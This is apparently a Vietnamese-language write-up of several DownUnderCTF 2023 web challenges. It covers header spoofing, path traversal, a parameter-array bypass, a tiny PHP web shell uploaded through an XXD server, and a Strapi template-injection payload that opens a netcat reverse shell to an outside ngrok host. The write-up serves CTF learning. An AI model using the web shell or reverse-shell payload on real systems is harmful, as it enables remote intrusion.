# DownUnderCTF 2023
## Proxed

```go
http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
    xff := r.Header.Values("X-Forwarded-For")

    ip := strings.Split(r.RemoteAddr, ":")[0]

    if xff != nil {
        ips := strings.Split(xff[len(xff)-1], ", ")
        ip = ips[len(ips)-1]
        ip = strings.TrimSpace(ip)
    }

    if ip != "31.33.33.7" {
        message := fmt.Sprintf("untrusted IP: %s", ip)
        http.Error(w, message, http.StatusForbidden)
        return
    } else {
        w.Write([]byte(os.Getenv("FLAG")))
    }
})
```

Câu này chỉ cần giá trị header `X-Forwarded-For: 31.33.33.7` là có flag.

![](https://github.com/rayinaw/ctf-challenges/assets/108481122/3cd2a02b-3be2-4e01-8b14-b6de49d5bd2f)

## Static file server

```py
from aiohttp import web

async def index(request):
    return web.Response(body='''
        <header><h1>static file server</h1></header>
        Here are some files:
        <ul>
            <li><img src="/files/ductf.png"></img></li>
            <li><a href="/files/not_the_flag.txt">not the flag</a></li>
        </ul>
    ''', content_type='text/html', status=200)

app = web.Application()


app.add_routes([
    web.get('/', index),

    # this is handled by https://github.com/aio-libs/aiohttp/blob/v3.8.5/aiohttp/web_urldispatcher.py#L654-L690
    web.static('/files', './files', follow_symlinks=True)
])
web.run_app(app)
```

Câu này sử dụng aiohttp để handler request, do browser xử lý path ta điền vào trước, do đó ta cần encode đường dẫn để path traversal như sau:

<img width="572" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/6c97d2ee-8598-4634-a400-8846bf1795c8">

## Actually proxed

Cũng tương tự câu `proxed`, ta cần làm sao để máy chủ phía sau nhận được giá trị của trường `X-Forwarded-For` là `31.33.33.7`.

Để được thì trước tiên ta cần bypass proxy server, đây là đoạn xử lý header:
```go
for i, v := range headers {
    if strings.ToLower(v[0]) == "x-forwarded-for" {
        headers[i][1] = fmt.Sprintf("%s, %s", v[1], clientIP)
        break
    }
}
```

Hàm này break ngay sau khi gặp và xử lý trường `X-Forwarded-For`, do đó ta có thể bypass bằng cách set header 2 lần:

![](https://github.com/rayinaw/ctf-challenges/assets/108481122/27cf80dd-5c3f-440b-8f60-8f35238dcafe)

## XXD Server

> Dockerfile
```dockerfile
FROM php:8.1-apache

COPY index.php .htaccess /var/www/html/
COPY flag /
RUN sed -i 's/AllowOverride None/AllowOverride All/g' /etc/apache2/apache2.conf
RUN mkdir -p /var/www/html/uploads && chmod 1333 /var/www/html/uploads
```
> .htaccess
```php
# Everything not a PHP file, should be served as text/plain
<FilesMatch "\.(?!(php)$)([^.]*)$">
    ForceType text/plain
</FilesMatch>
```

Ở file htaccess, file nào không phải là php thì set content-type là text/plain. Do đó cũng không ảnh hưởng đến bài này.

```php
<?php

// Emulate the behavior of command line 'xxd' tool
function xxd(string $s): string {
	$out = '';
	$ctr = 0;
	foreach (str_split($s, 16) as $v) {
		$hex_string = implode(' ', str_split(bin2hex($v), 4));
		$ascii_string = '';
		foreach (str_split($v) as $c) {
			$ascii_string .= $c < ' ' || $c > '~' ? '.' : $c;
		}
		$out .= sprintf("%08x: %-40s %-16s\n", $ctr, $hex_string, $ascii_string);
		$ctr += 16;
	}
	return $out;
}

$message = '';

// Is there an upload?
if (isset($_FILES['file-upload'])) {
	$upload_dir = 'uploads/' . bin2hex(random_bytes(8));
	$upload_path = $upload_dir . '/' . basename($_FILES['file-upload']['name']);
	mkdir($upload_dir);
	$upload_contents = xxd(file_get_contents($_FILES['file-upload']['tmp_name']));
	if (file_put_contents($upload_path, $upload_contents)) {
		$message = 'Your file has been uploaded. Click <a href="' . htmlspecialchars($upload_path) . '">here</a> to view';
	} else {
	    $message = 'File upload failed.';
	}
}

?>
```

File được upload lên sẽ bị cắt từng 16 ký tự để in ra xxd, đuôi file giữ nguyên do đó ta chỉ cần payload nào nhỏ hơn hoặc bằng 16 ký tự là được:

```sh
pwn@DESKTOP-AC6UABE:pts/0->/home/pwn (1)
> echo '<?=`$_GET[0]`;?>'>pwn.php
pwn@DESKTOP-AC6UABE:pts/0->/home/pwn (0)
> cat pwn.php
<?=`$_GET[0]`;?>
pwn@DESKTOP-AC6UABE:pts/0->/home/pwn (0)
> curl https://web-xxd-server-2680de9c070f.2023.ductf.dev/ -F 'file-upload=@./pwn.php'
pwn@DESKTOP-AC6UABE:pts/0->/home/pwn (0)
> curl https://web-xxd-server-2680de9c070f.2023.ductf.dev/uploads/a09b7e9c7bbf7d50/pwn.php\?0\=cat+/
flag
00000000: 3c3f 3d60 245f 4745 545b 305d 603b 3f3e  DUCTF{00000000__7368_656c_6c64_5f77_6974_685f_7878_6421__shelld_with_xxd!}00000010: 0a
```

## CGI Fridays

Câu này sử dụng `CGI::Minimal` để xử lý request.

```pl
#!/usr/bin/env perl

use strict;
use warnings;
use CGI::Minimal;

use constant HTDOCS => '/usr/local/apache2/htdocs';

sub read_file {
	my ($file_path) = @_;
	my $fh;

	local $/;
	open($fh, "<", $file_path) or return "read_file error: $!";
	my $content = <$fh>;
	close($fh);

	return $content;
}

sub route_request {
	my ($page, $remote_addr) = @_;

	if ($page =~ /^about$/) {
		return HTDOCS . '/pages/about.txt';
	}

	if ($page =~ /^version$/) {
		return '/proc/version';
	}

	if ($page =~ /^cpuinfo$/) {
		return HTDOCS . '/pages/denied.txt' unless $remote_addr eq '127.0.0.1';
		return '/proc/cpuinfo';
	}

	if ($page =~ /^stat|io|maps$/) {
		return HTDOCS . '/pages/denied.txt' unless $remote_addr eq '127.0.0.1';
		return "/proc/self/$page";
	}

	return HTDOCS . '/pages/home.txt';
}

sub escape_html {
	my ($text) = @_;

	$text =~ s/</&lt;/g;
	$text =~ s/>/&gt;/g;

	return $text;
}

my $q = CGI::Minimal->new;

print "Content-Type: text/html\r\n\r\n";


my $file_path = route_request($q->param('page'), $ENV{'REMOTE_ADDR'});
my $file_content = read_file($file_path);

print escape_html($file_content);

print escape_html("$ENV{'REMOTE_ADDR'}");
```

Ở đoạn sau:
```perl
if ($page =~ /^stat|io|maps$/) {
    return HTDOCS . '/pages/denied.txt' unless $remote_addr eq '127.0.0.1';
    return "/proc/self/$page";
}
```
Nếu page chứa stat, io hoặc maps thì đưa trực tiếp giá trị của biến `$page` vào để thực hiện đọc file: `my $file_content = read_file($file_path);`

Vậy ta sẽ tìm cách để thực hiện path traversal, tuy nhiên ta cần phải bypass được điều kiện giá trị của biến `$remote_addr` là `127.0.0.1`.

Phân tích:
- @ trong perl đại diện cho một mảng, `@_` đại diện cho tất cả các tham số được truyền vào cho một subroutine (sub)
https://perldoc.perl.org/perlvar#@_
- Nếu truyền dư tham số thì nó chỉ lấy những giá trị đầu.
```sh
> cat test.pl
my @numbers = (1, 2, 3, 4);
my ($n1, $n2) = @numbers;
print $n1;
print $n2;
> perl test.pl
12%
```
- Đồng thời, trong perl để truyền array thì phải truyền tham chiếu, nếu không thì nó sẽ xem các giá trị trong array như truyền biến bình thường:
```sh
> cat test.pl
sub test {
        my ($p1, $p2) = @_;
        print $p1;
        print $p2;
        return 0;
}

@arr = (1, 2);
test(@arr, 3);
> perl test.pl
12%
```
- Và với [CGI::Minimal](https://metacpan.org/pod/CGI::Minimal#param([$fieldname]);), nếu truyền nhiều param cùng tên trên query thì sẽ xem như là một array. 
<img width="797" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/e84f11bf-d750-4f62-b34e-99ddcf493ddf">

Do đó ta có thể bypass như sau:

<img width="755" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/42e0e6f0-8477-404c-bf2b-e828d29239cd">


Để path traversal được thì ta cần kiếm folder nào có tên chứa io/stat/maps, các bạn có thể pull httpd:2.4 về rồi search: 
```sh
find / -type d 2>/dev/null | grep 'io'
```

<img width="289" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/dd9deefa-dff8-43c2-bd46-b31e6066a5ab">

Lấy flag:

<img width="764" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/8a804fa2-7b75-47ad-b917-02cd707c0d5e">

## Strapi

Bài này mình không giải được, tìm thấy lỗ hổng rồi nhưng mà cái plugin rối quá lười làm cmnl.

https://github.com/strapi/strapi/issues/16730

Bug của nó là do `<%- value %>` không hoạt động được nên strapi nó không cấm `<%= value %>` và để người dùng tự filter. Do đó tác giả sử dụng lỗ hổng này và không filter gì cả. 

Trong issue trên cũng nói này là của lodash nên mình có search ra payload sau:
```js
${x=Object}${w=a=new x}${w.type="pipe"}${w.readable=1}${w.writable=1}${a.file="/bin/sh"}${a.args=["/bin/sh","-c","rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 0.tcp.ap.ngrok.io 17965 >/tmp/f"]}${a.stdio=[w,w]}${process.binding("spawn_sync").spawn(a).output}
```
Link: https://twitter.com/rootxharsh/status/1268181937127997446

Payload reverse shell lấy ở [đây](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-busybox).

Full payload:
```js
<%= `${x=Object}${w=a=new x}${w.type="pipe"}${w.readable=1}${w.writable=1}${a.file="/bin/sh"}${a.args=["/bin/sh","-c","rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 0.tcp.ap.ngrok.io 17965 >/tmp/f"]}${a.stdio=[w,w]}${process.binding("spawn_sync").spawn(a).output}` %>
```